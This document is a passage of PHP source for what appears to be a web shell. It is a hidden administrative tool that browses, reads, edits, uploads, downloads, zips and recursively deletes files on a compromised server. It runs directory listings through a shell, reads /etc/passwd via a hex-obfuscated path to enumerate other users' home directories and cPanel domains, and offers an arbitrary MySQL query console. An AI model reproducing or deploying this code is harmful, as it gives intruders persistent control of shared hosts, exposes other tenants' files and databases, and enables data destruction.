									<td><a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr_file(\''.$this->strToHex($path).'\');"><img alt="" src="data:image/gif;base64,R0lGODlhEAAQANUAAMzMzMvLy8rKysnJycXFxcLCwsHBwcDAwL6+vr29vby8vLu7u7q6urm5ubi4uLKysrCwsK6urq2traysrKurq6qqqqioqKenp6ampqKiop+fn5mZmZiYmJeXl5WVlZOTk5KSkoqKioiIiIWFhYSEhIODg4GBgTc3N////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACgALAAAAAAQABAAAAZiQJRwSAwMCMTkMFBwOBhKIuAwxFyiKAF1uAFhEYotylPCJhSQCqozwqIWEkyGrRQYDgiJRQNqJwMHDQwSalh2QhAYGhxYBVBDHyJYCw1DHCRuKA8TYyaZQhEUIZ9CJ6SnQ0EAOw==" /> <font color="#FFFFFF"> '.$nfd.' => '.readlink($path).'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td width="1%" align="center">'.$this->format_fperms($path, 'tl').'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="exp_delete_this(\''.$this->strToHex($path).'\', \'rmlink\', \''.$this->strToHex($loc).'\');"></a></td></tr>';
			}
			$this->dPlay($content);

			$contStock = $this->get_dir_contents($loc, 3);
			$content  = '';
			foreach($contStock as $nfd) {
				$path = $this->str_fromArray($this->path_strip($loc.$this->getSeparator().$nfd), $this->getSeparator(), "path");

				$content .= '<tr bgcolor="#020202">
									<td ><a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr_file(\''.$this->strToHex($path).'\');"><img alt="" src="data:image/gif;base64,R0lGODlhEAAQAPcAAOb29tbf39Lb2/f///T8/PD4+O319eHp6ezz873Dw/n//+Hn5+Dm5vT5+evw8OXq6ru/v9vf39fb2/z//9XY2NTX19DS0v7//9fY2NbX19HS0rq7u4qLi/AAAN8AANsAANoAANUAAMkAAMQAALgAALUDA8UQEL0PD6YXF9sfH88rK9YvL9UwMMgtLc5JSc5LS9FcXNJdXcNYWNhjY/+Dg/+EhM1ra8hra/+KivCCgul+fuyEhP+QkP+RkfCJif+Vlf+WlvKQkP+Zmf+amv+bm/WWlv+dnf+fn/+goPSZmf+hof+iovqiovGcnPqjo/+np/ukpPOgoO6dneSWlu+goO2goO6hof+urv+ysv+zs7WCgv+4uP+8vP/Gxv/Hx//IyP/Ly//MzKGBgf/R0bKYmODDw//l5f/o6P/p6f/u7vzr6//v7//x8f/19f/29v/6+v/8/P/9/dHQ0M7Nzb69vf////39/ePj49fX19TU1M/Pz8bGxsLCwqSkpH9/f3p6ev///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAIAALAAAAAAQABAAAAjNAAEJHEiwYEE+BhMCkmNnwIEKGhQKzFBnTZ2LChQYWCABz56BDOoYIRLGDBs2cC7WuTOQwJsjQVysiMEEyZAtdSIIpHPhTBMVIUiIeAGFRpY6FATmqTPGhwkWWjqAmNJjTB09Ah3UucLDyo0UHlpEAZJmwsALbn4goTLig4wqQpTUQSAQQ50vOJzAQGGDyxMcXepYENggDpIaSU6UkLJERw41BQTquYgGDJYdM3AUEUMmAYSBc1RebOOlTB0BCf9seHARQIA+Egf64ZAwIAA7" />	<font color="#FFFF00"> '.$nfd.' => '.readlink($path).'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td width="1%" align="center">'.$this->format_fperms($path, 'tl').'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<tdwidth="1%" align="center"></td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="exp_delete_this(\''.$this->strToHex($path).'\', \'rmlink\', \''.$this->strToHex($loc).'\');"></a></td></tr>';
			}
			
			$content .= '</table>';
		}
			
		$this->dPlay($content);
	}

	/**************************************************************************************************/
	/**************************************************************************************************/
	function get_dir_contents($path, $type = -1) {
		if(!$this->is_path_readable($path))
			return array();

		$case = 0;
		$temp = NULL;
		$contStock = array();
		$contTmp = array();
		
		if(function_exists("scandir") && ($temp = scandir($path)) !== false) {
			foreach($temp as $stock) {
				$tmp = $this->str_fromArray($this->path_strip($path.$this->getSeparator().$stock), $this->getSeparator(), "path");
				if($stock != "") {
					switch($type) {
						case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
						case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
						case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
						case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;	
						default : $contTmp[] = $stock; break;
					}
				}
			}
		}

		if(sizeof($contTmp) > sizeof($contStock)) {
			$contStock = $contTmp;
			$contTmp = array();
			$case = 1;
		}
	
		$temp = NULL;
		$contTmp = array();
		if(function_exists("opendir") && ($temp = opendir($path)) !== false) {
			while(($stock = readdir($temp)) !== false) {
				$tmp = $this->str_fromArray($this->path_strip($path.$this->getSeparator().$stock), $this->getSeparator(), "path");
				if($stock != "") {
					switch($type) {
						case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
						case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
						case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
						case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;		
						default : $contTmp[] = $stock; break;
					}
				}
			}
			sort($contTmp);
		}
		
		if(sizeof($contTmp) > sizeof($contStock)) {
			$contStock = $contTmp;
			$contTmp = array();
			$case = 2;
		}

		if(isset($_COOKIE['xallow']) && $_COOKIE['xallow'] == "null") {
			echo "null";
			$temp = NULL;
			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
				$temp = $this->do_through_shell("dir /A /B ".$path);
			}else {
				$temp = $this->do_through_shell("ls -a ".$path);
			}
			$tmp_array = explode("\n", $temp);
	
			$contTmp = array();
			foreach($tmp_array as $stock) {
				$tmp = $this->str_fromArray($this->path_strip($path.$this->getSeparator().$stock), $this->getSeparator(), "path");
				if($stock != "") {
					switch($type) {
						case 0: if($this->is_this_dir($tmp)) $contTmp[] = $stock; break;
						case 1: if($this->is_this_file($tmp)) $contTmp[] = $stock; break;
						case 2: if($this->is_this_link($tmp)) $contTmp[] = $stock; break;
						case 3: if($this->is_this_unk($tmp)) $contTmp[] = $stock; break;		
						default : $contTmp[] = $stock; break;
					}
				}
			}
			sort($contTmp);
			
			if(sizeof($contTmp) > sizeof($contStock)) {
				$contStock = $contTmp;
				$contTmp = array();
				$case = 3;
			}
		}

		return $contStock;
	}
		
	/**************************************************************************************************/
	/**************************************************************************************************/
	public function get_file($path) {
		$stock = array();
		
		if($this->is_this_file($path)) {
			if($this->format_fsize($path, "1") <= 2048)
				$stock = $this->read_file($path);
			else {
				$content = '<table align="center" width="100%" bgcolor="#666666">
								<tr><td align=center bgcolor="black">File\'s '.$path.' size exceeds 2 Mb !!!</td></tr></table>';
				$this->dPlay($content);
				exit;
			}
		}else if($this->is_this_link($path)) {
			$stock = $this->read_link($path);
		}else {
			$stock = $this->read_unk($path);
		}
		
		if($stock['flag'] == 1 && $this->format_fperms($path, 'tl') == 'd') {
			$content = '<table align=center width=80% bgcolor="#666666">';
			
			$ctrim = explode("\n", $stock['content']);
			foreach($ctrim as $lnkinlnk) {
				$content .= '<tr><td align=center bgcolor="black">'.$lnkinlnk.'</td></tr>';
			}
			
			$content .= '</table>';
				
		}else {
			$stock['content'] = str_replace("<", "&lt;", $stock['content']);
			$stock['content'] = str_replace(">", "&gt;", $stock['content']);
			
			$access = $this->format_fperms($path, "s");
			$texID = $this->genString(32);
			$content = '<table align=center width=80% bgcolor="#226666" style="border:1px #0077AA"><tr><td align=center bgcolor="black">
								<font color="#FF3300">Viewing File: </font>
								<font color=green>'.$path.'</font> - <font color=white> ['.$access.'] </font>';
								
			$content .= '</td></tr><tr><td align=center bgcolor="black">
						<textarea id="'.$texID.'" '.(($this->format_fperms($path, "w")=="w")?"":"readonly").' cols=100 rows=25 style="border:double; resize: none; border-color:#9F0; '.( ($this->format_fperms($path, "w")=="w")?"background-color:#150005; color:#FFFFFF":"background-color:#F94545; color:#000000"). '">'.$stock['content'].'</textarea></td></tr><tr><td>'.(($this->format_fperms($path, "w")==="w")?'<input type="button" value="Save" onclick="exp_save_this(\''.$this->strToHex($path).'\', \'save\', \''.$texID.'\');">':'<input style="color:#FF7777" disabled type="button" value="Save">').'</td></tr></table>
			';
		}
		
		$this->dPlay($content);
	}
	
	function genString($len) {
		if(is_numeric($len) && $len > 0) {
			$output = "";
			for($i=0; $i<$len; $i++) {
				$rnd = rand(0, 2); 
				if($rnd == 0) $output .= chr(rand(97, 122));
				if($rnd == 1) $output .= chr(rand(48, 57));
				if($rnd == 2) $output .= chr(rand(65, 90));
			}
			return $output;
		}
		return "null";
	}
	
	public function path_check_and_retrieve($path) {
		if($this->is_path_readable($path)) {
			$contStock = $this->get_dir_contents($path, 0);
			$tmp_result = array();
			foreach($contStock as $nfd) {
				$loc = $this->str_fromArray($this->path_strip($loc.$this->getSeparator().$nfd), $this->getSeparator(), "path");
				
				if($nfd != "." && $nfd != "..") {
					array_push($tmp_result, $loc);
				}
			}
			return $this->str_fromArray($tmp_result, ";");
		}
		return "";
	}
	/**************************************************************************************************/
	/**************************************************************************************************/
	public function exp_actions($from="", $to="", $action, $rewrite=false) {
		$result = "1x0000";
		switch($action) {
			case "copy":
				if(($this->is_this_file($from) && !$this->is_this_file($to)) || 
					($this->is_this_file($from) && $this->is_this_file($to) && $rewrite)) {
					if(copy($from, $to)) {
						$result = "0x0001";
					}else {
						$result = "1x0001";
					}
				}else {
					$result = "1x0011";	
				}
				break;
			case "rename":
				if(($this->is_this_file($from) && !$this->is_this_file($to)) || 
					($this->is_this_file($from) && $this->is_this_file($to) && $rewrite)) {
					if(rename($from, $to)) {
						$result = "0x0002";
					}else {
						$result = "1x0002";
					}
				}else {
					$result = "1x0012";	
				}
				break;
			case "save":
			
				if(!$this->is_this_file($to)) {
					if(!$this->is_this_dir(dirname($to))) {
						$this->exp_actions(_, dirname($to), "mkdir", _);
						$result = "0x0003";
					}
				}

				$save = @fopen($to, 'w') or die("1x0003: Can't open file !");
				fwrite($save, $this->hexToStr($from));
				fclose($save);
				
				break;
			case "rmdir":
				$get_dir = $this->get_dir_contents($from, 0);
				foreach($get_dir as $dir) {
					$nextDir = $this->str_fromArray($this->path_strip($from.$this->getSeparator().$dir), $this->getSeparator(), "path");
					if($dir != "." &&  $dir != "..")
						$this->exp_actions($nextDir, _, "rmdir", _);
				}
				$get_file = $this->get_dir_contents($from, 1);
				foreach($get_file as $file) { 
					$nextFile = $this->str_fromArray($this->path_strip($from.$this->getSeparator().$file), $this->getSeparator(), "path");
					$this->exp_actions($nextFile, _, "rmfile", _);
				}
				$get_link = $this->get_dir_contents($from, 2);
				foreach($get_link as $link) {
					$nextLink = $this->str_fromArray($this->path_strip($from.$this->getSeparator().$link), $this->getSeparator(), "path");
					$this->exp_actions($nextLink, _, "rmlink", _);
				}
				$get_unk = $this->get_dir_contents($from, 3);
				foreach($get_unk as $unk) { 
					$nextUnk = $this->str_fromArray($this->path_strip($from.$this->getSeparator().$unk), $this->getSeparator(), "path");
					$this->exp_actions($nextUnk, _, "rmunk", _);
				}
				$result = rmdir($from); 

				break;
			case "rmfile": case "rmlink": case "rmunk":
				if($this->is_this_file($from) || $this->is_this_link($from) || $this->is_this_unk($from))
					$result = unlink($from);
				break;
			case "mkdir":
				if(!$this->is_this_dir($to)) {
					mkdir($from);
					$result = "0x0006";
				}else {
					$result = "1x0006";
				}
				break;	
			case "mkfile":
				if(!$this->is_this_file($to) || (!$this->is_this_file($to) && $rewrite)) {
					$hdl = fopen($to, "w");
					fclose($hdl);
					$result = "0x0007";
				}else {
					$result = "1x0007";
				}
				break;	
			case "download":
				if($this->is_this_file($from)) {
					$filename = pathinfo($from, PATHINFO_BASENAME);
					header('Content-disposition: attachment; filename="'. $filename .'"');
					header('Content-type: application/octet-stream');
					readfile($from);
					$result = "0x0008";
				}else {
					$result = "1x0008";
				}
				break;
			case "zip":
				$source = $from;
				$destination = $to;
				
				$source = $this->setSeparator($source);
				$source = $this->setPartition($source);
				$source = $this->str_fromArray($this->path_strip($source), $this->getSeparator(), "path");
				
				if (!extension_loaded('zip') || !file_exists($source)) {
					$result = "1x0009";
					break;
				}
				
				$destination = $this->setSeparator($destination);
				$destination = $this->setPartition($destination);
				$destination = $this->str_fromArray($this->path_strip($destination), $this->getSeparator(), "path");
			
				$zip = new ZipArchive();
				if (!$zip->open($destination, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE)) {
					$result = "1x0019";
					break;
				}
				
				if ($this->is_this_dir($source)) {
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
			
					foreach ($files as $file) {
						$file = $this->setSeparator($file);
						
						if( in_array(substr($file, strrpos($file, $this->getSeparator())+1), array('.', '..')) )
							continue;
						
						if ($this->is_this_dir($file))
							$zip->addEmptyDir(str_replace($source.$this->getSeparator(), '', $file));
						else if ($this->is_this_file($file))
							$zip->addFile($file, str_replace($source.$this->getSeparator(), '', $file));
						else
							$zip->addFromString($file, file_get_contents($file));
					}
				}else if ($this->is_this_file($source) === true) {
					$zip->addFile(basename($source), basename($source));
				}else {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
				
				$zip->close();
				$result = "0x0009";
				break;
			case "upload":
				
				break;
			default:break;
		}
		
		return $result;
	}

	
	function file_upload_type() {
		if($_SESSION['ftp_file_upload_type'] == "uF1") {
			echo "<table align='center' bgcolor='#FFFFFF' width=100%>
				<tr align='center'><td bgcolor='#122112' colspan=1000><b> Uploading by ftp session ...</b></td></tr>
				<tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'>
				 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_session'><input type='submit' value='Submit'></form></td></tr>";
			
			if(isset($_POST['myfile_session'])) {
				if ($_FILES['upfile']['error'] > 0){
					echo "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
				}else {
					echo "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
					if(move_uploaded_file($_FILES['upfile']['tmp_name'], $_SESSION['chdir'].$this->getSeparator(). $_POST['myfile_session'])) {
						echo "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SESSION['chdir'].$this->getSeparator(). $_POST['myfile_session']. "</b></td></tr>";
					}else if(rename($_FILES['upfile']['tmp_name'], $_SESSION['chdir'].$this->getSeparator(). $_POST['myfile_session'])){
						echo "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $_SESSION['chdir'].$this->getSeparator(). $_POST['myfile_session']. "</b></td></tr>";
					}else
						echo "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
				}
			}
			
			echo "</table>";
		}
		
		if($_SESSION['ftp_file_upload_type'] == "uF2") {
		//<!-- PHP --> 
		//if(isset($_GET['t-t'])) {	
			echo "<table align='center' bgcolor='#FFFFFF' width=100%>
				<tr align='center'><td bgcolor='#122112' colspan=1000><b> Uploading by server root...</b></td></tr>
				<tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'>
				 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_root'><input type='submit' value='Submit'></form></td></tr>";
			
			if(isset($_POST['myfile_root'])) {
				if ($_FILES['upfile']['error'] > 0){
					echo "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
				}else {
					echo "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
					if(move_uploaded_file($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] .$this->getSeparator(). $_POST['myfile_root'])) {
						echo "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SERVER["DOCUMENT_ROOT"].$this->getSeparator(). $_POST['myfile_root']. "</b></td></tr>";
					}else if(rename($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] .$this->getSeparator(). $_POST['myfile_root'])){
						echo "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $_SERVER["DOCUMENT_ROOT"].$this->getSeparator(). $_POST['myfile_root']. "</b></td></tr>";
					}else
						echo "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
				}
			}
			
			echo "</table>";
		}
	}
}

class Users extends Util {
	public function get_users(){
		if(isset($_GET['users_mode'])) {
			$_SESSION['users_mode'] = $_GET['users_mode'];
			if(isset($_GET['users_dir']))
				$_SESSION['users_dir'] = $_GET['users_dir'];
			header("Location: ?t-t");
		} 
		
		$content = '<table style="border-color:#9F0" width="70%" border="0" align="center">
		<tr bgcolor="#99CC00"><td align="center" style="border-style:groove;"><font color="#444444">User</font></td>
		<td align="center" style="border-style:groove;"><font color="#444444">Path</font></td>
		<td align="center" style="border-style:groove;"><font color="#444444">Access</font></td>
		<td align="center" style="border-style:groove;"><font color="#444444">Domain(s)</font></td></tr>';
		$this->dPlay($content);
		
		if($_SESSION['users_mode'] == "uScan" && function_exists("posix_getpwuid")) {
			for($i=0, $j=0, $u=0;$j<1000;$i++) {
				$content = "";
				if($data = posix_getpwuid($i)) {
					if($this->str_startsWith($_SESSION['users_dir'], $data['dir'])) {
						$data['dom'] = $this->get_user_dom($data['dir']);
						if(sizeof($data['dom']) > 0) {
							if($data['dom'][0] != "about:blank")
								$data['dir'] .= "/public_html";
							$rootDirs = explode("/", $data['dir']);
							$pathDirs = "";
							$data['dir'] = "";
							for($a = 0; $a<sizeof($rootDirs); $a++)
								if($rootDirs[$a] != "") {
									$pathDirs .= "/".$rootDirs[$a];
									if(is_readable($pathDirs))
										$data['dir'] .= '<a href="?t-t&chdir='.$pathDirs.'" target="_blank" style="text-decoration:none"><font color="#00FF00">/'.$rootDirs[$a].'</font></a>';
									else
										$data['dir'] .= '<font color="#FF0000">/'.$rootDirs[$a].'</font>';
								}
							
							$content .= '<tr bgcolor='.($u%2 != 0 ? "#002200": "#110011").'>';
							$content .= '<td><font color="white"><b>'.$data['name'].'</b></font></td>';
			
							$content .= '<td>'.$data['dir'].'</td>';
							$content .= '<td>'.((is_readable($pathDirs)) ? '<font color=green>[<a href="?t-t&chdir='.$pathDirs.'" target="_blank"  style="text-decoration:none"><font color="white">&radic;</font></a>] Can read</font>':"<font color=red>[&chi;] Can't read</font>").'</td>';
							$content .= '<td align="center"><b>[ <font color="white">'.sizeof($data['dom']).'</font> ]</b>
											<select id="dom_link'.$u.'" style="border-style:none; width:200">';
						
							for($k=0; $k<sizeof($data['dom']); $k++)
								$content .= '<option value="http://'.$data['dom'][$k].'">'.$data['dom'][$k].'</option>';
						
							$content .= '</select><input type="button" value="View" style="border-style:none" 
											onclick="window.open(document.getElementById(\'dom_link'.$u.'\').value);"></td></tr>';
							$u++;
						}
					}
					$j=0;
				}else {
					$j++;
				}
				$this->dPlay($content);
			}
		}
		
		if($_SESSION['users_mode'] == "uPasswd") {
			if(is_array($passwd = file($this->hexToStr('2f6574632f706173737764')))) {
				$u = 0; 
				foreach($passwd as $usr) {
					$content = "";
					$disUsr = explode(":", $usr);
					$data['name'] = $disUsr[0];
					$data['dir'] = $disUsr[5];	
					
					if($this->str_startsWith($_SESSION['users_dir'], $data['dir'])) {
						$data['dom'] = $this->get_user_dom($data['dir']);
						
						if(sizeof($data['dom']) > 0) {
							if($data['dom'][0] != "about:blank")
								$data['dir'] .= "/public_html";
							$rootDirs = explode("/", $data['dir']);
							$pathDirs = "";
							$data['dir'] = "";
							for($a = 0; $a<sizeof($rootDirs); $a++)
								if($rootDirs[$a] != "") {
									$pathDirs .= "/".$rootDirs[$a];
									if(is_readable($pathDirs))
										$data['dir'] .= '<a href="?t-t&chdir='.$pathDirs.'" target="_blank" style="text-decoration:none"><font color="#00FF00">/'.$rootDirs[$a].'</font></a>';
									else
										$data['dir'] .= '<font color="#FF0000">/'.$rootDirs[$a].'</font>';
								}
						
							$content .= '<tr bgcolor='.($u%2 != 0 ? "#002200": "#110011").'>';
							$content .= '<td><font color="white"><b>'.$data['name'].'</b></font></td>';
			
							$content .= '<td>'.$data['dir'].'</td>';
							$content .= '<td>'.((is_readable($pathDirs)) ? '<font color=green>[<a href="?t-t&chdir='.$pathDirs.'" target="_blank"  style="text-decoration:none"><font color="white">&radic;</font></a>] Can read</font>':"<font color=red>[&chi;] Can't read</font>").'</td>';
							$content .= '<td align="center"><b>[ <font color="white">'.sizeof($data['dom']).'</font> ]</b>
											<select id="dom_link'.$u.'" style="border-style:none; width:200">';
						
							for($k=0; $k<sizeof($data['dom']); $k++)
								$content .= '<option value="http://'.$data['dom'][$k].'">'.$data['dom'][$k].'</option>';
								
							$content .= '</select><input type="button" value="View" style="border-style:none" 
											onclick="window.open(document.getElementById(\'dom_link'.$u.'\').value);"></td></tr>';
							$u++;
						}
					}
					$this->dPlay($content);
				}
			}
		}
		$content = '</table>';
		$this->dPlay($content);
	}
	private function get_user_dom($path) {
		$contStock = array();
		
		if($get = scandir($path.'/tmp/cpbandwidth'))
			foreach($get as $dom) {
				$dom_f = array();
				if($dom != '.' && $dom != '..') {
					$dom_f=explode('-bytes',$dom);
					$contStock[] = $dom_f[0];
				}
			}
		else if($container = opendir($path.'/tmp/cpbandwidth')) {
			$newStock = array();
			
			while (false !== ($get = readdir($container)))
				$newStock[] = $get;
			sort($newStock);
			
			foreach($newStock as $dom) {
				$dom_f = array();
				if($dom != '.' && $dom != '..') {
					$dom_f=explode('-bytes',$dom);
					$contStock[] = $dom_f[0];
				}
			}
		}else if(scandir($path.'/public_html') || opendir($path.'/public_html')) {	
			$contStock[] = "unknown:address";
		}else {
			$contStock[] = "about:blank";
		}
		
		return $contStock;
	}
}

class MySql extends Util {
	function mysql_nontri() {
		if(isset($_GET['connect'])) {
			$coninfo = explode(":", $_GET['connect']);
			if(sizeof($coninfo) == 3) {
				$dbhost = strlen($coninfo[0]) == 0 ? "localhost":$coninfo[0];
				$dbuser = $coninfo[1];
				$dbpass = $coninfo[2];
			}else if(sizeof($coninfo) == 4) {
				if($coninfo[3] == "hx") {
					$dbhost = strlen($coninfo[0]) == 0 ? "localhost":$coninfo[0];
					$dbuser = $NVShl->hexToStr($coninfo[1]);
					$dbpass = $NVShl->hexToStr($coninfo[2]);
				}
			}
			
			mysql_connect($dbhost, $dbuser, $dbpass) or die("<center><font color='#FFFFFF'>[Login] Invalid connection settings !</font></center>");
			
			$_SESSION['connect'] = 'true';
			$_SESSION['dbhost'] = $dbhost;
			$_SESSION['dbuser'] = $dbuser;
			$_SESSION['dbpass'] = $dbpass;
			
			header("Location: ?t-t");
		}else if(isset($_GET['disconnect'])) {
			$_SESSION['connect'] = '';
			die("<center><font color='#FFFFFF'>Disconnected from the server !</font></center>");
		}else {
			$link = "";
			
			if($_SESSION['connect'] == 'true') {
				$link = mysql_connect($_SESSION['dbhost'], $_SESSION['dbuser'], $_SESSION['dbpass']) or die("<center><font color='#FFFFFF'>[Loged] Invalid connection settings !</font></center>");
				echo "<center><font color='#FFFFFF'>Connection by session!</font></center>";
			}else {
				return;
			}
			
			$db_list = mysql_list_dbs($link);

			if(isset($_POST['reqsend'])) {
				if(isset($_POST['selectdb']) && $_POST['selectdb'] != "") {
					$_SESSION['dbselect'] = $_POST['selectdb'];
					if(!mysql_select_db($_SESSION['dbselect']))
						echo "Error: Database not found !";
				}
				
				if(isset($_POST['qt']) && $_POST['qt'] != "")
					$_SESSION['dbqt'] = $_POST['qt'];
				
				if(isset($_POST['sqlquery']) && $_POST['sqlquery'] != "") {
					$_SESSION['dbquery'] = $_POST['sqlquery'];
					$sqc = $_SESSION['dbquery'];
					$sqc = str_replace("<", "&lt;", $sqc);
					$sqc = str_replace(">", "&gt;", $sqc);
					
					echo "<table align='center' bgcolor='#FFFFFF' width=100%><tr align='center'><td bgcolor='#99CC00' colspan=1000><b>{$sqc}</b></td></tr>";
					$myresult = mysql_query($_SESSION['dbquery']);
		
					if($_SESSION['dbqt'] == 'none') {
						echo "<tr align='center'><td bgcolor='#99CC00' colspan=1000><b>Took effect ". mysql_affected_rows($myresult)." entries ...</b></td></tr>";
					}else {
						$ctres = 0;
						if($_SESSION['dbqt'] == 'array')
							while ($queryrow = mysql_fetch_array($myresult)) {
								echo "<tr>";
								for($i=0; $i<sizeof($queryrow); $i++)
									echo "<td>".$queryrow[$i]."</td>";
								echo "</tr>";
								$ctres++;
							}
						else if($_SESSION['dbqt'] == 'row')
							while ($queryrow = mysql_fetch_row($myresult)) {
								echo "<tr>";
								for($i=0; $i<sizeof($queryrow); $i++)
									echo "<td>".$queryrow[$i]."</td>";
								echo "</tr>";
								$ctres++;
							}
						else if($_SESSION['dbqt'] == 'assoc')
							while ($queryrow = mysql_fetch_assoc($myresult)) {
								echo "<tr>";
								for($i=0; $i<sizeof($queryrow); $i++)
									echo "<td>".$queryrow[$i]."</td>";
								echo "</tr>";
								$ctres++;
							}
						echo "<tr align='center'><td bgcolor='#99CC00' colspan=1000><b>Found {$ctres} results ...</b></td></tr>";
					}
					
					echo "</table>";
				}
			}else {
				echo "<form action='?{$_SERVER['QUERY_STRING']}' method='post' target='MyQuery'><table align=center bgcolor='#99CC00' width=100%>
				<tr align='center'><td colspan=2><font style='font-weight:bold;'>". $_SERVER['SERVER_SIGNATURE']."</font></td></tr>
				<tr><td>Select Database: <input type='text' name='selectdb' size='50' value='{$_SESSION['dbselect']}'></td>
					<td>Query type: <select name='qt'>";
				if($_SESSION['dbqt'] == "none")
					echo "<option value='none' selected='selected'>None</option>";
				else
					echo "<option value='none'>None</option>";
				
				if($_SESSION['dbqt'] == "query")
						echo "<option value='array' selected='selected'>Array</option>";
					else
						echo "<option value='array'>Array</option>";
				
				if($_SESSION['dbqt'] == "row")
					echo "<option value='row' selected='selected'>Row</option>";
				else
					echo "<option value='row'>Row</option>";
					
